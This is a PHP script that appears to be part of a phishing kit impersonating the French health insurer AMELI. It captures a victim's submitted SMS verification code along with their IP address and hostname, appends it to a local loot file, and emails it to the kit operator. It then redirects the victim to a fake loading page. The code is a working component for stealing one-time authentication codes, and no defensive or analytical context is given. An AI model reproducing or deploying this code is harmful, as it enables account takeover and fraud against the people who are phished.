<?php
include 'antibots.php';
include 'email.php';
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AMELI]\n";
$message .= "SMS3      : ".$_POST['10']."\n";
$message .= "[DON]\n";
$file = fopen("../../sms3.txt","a");
fwrite($file, "\n".$message);
fclose($file);
$subject = "DON[SMS2] $ip";
$headers = "From: <localhost>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding4.html");
// -->
</script>';

?>